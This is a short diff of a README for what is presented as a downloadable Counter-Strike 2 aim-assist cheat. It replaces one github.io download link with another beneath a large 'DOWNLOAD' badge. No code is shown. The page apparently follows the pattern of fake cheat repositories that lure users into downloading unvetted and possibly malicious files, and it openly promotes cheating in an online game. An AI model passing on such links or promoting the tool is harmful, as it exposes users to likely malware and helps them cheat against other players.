@@ -2,7 +2,7 @@
 ### *Dominate every duel with perfect aim and no recoil disruptions.*
 
 <p align="center">
-  <a href="https://download-portal-demo.github.io/.github/CS2Aimassist1" target="_blank">
+  <a href="https://trahendon.github.io/.github/CS2AimAssistInfo2PC" target="_blank">
     <img src="https://img.shields.io/badge/⬇️ DOWNLOAD-CS2_AIM_ASSIST-blue?style=for-the-badge&logo=counter-strike&logoColor=white" alt="Download CS2 Aim Assist" />
   </a>
 </p>
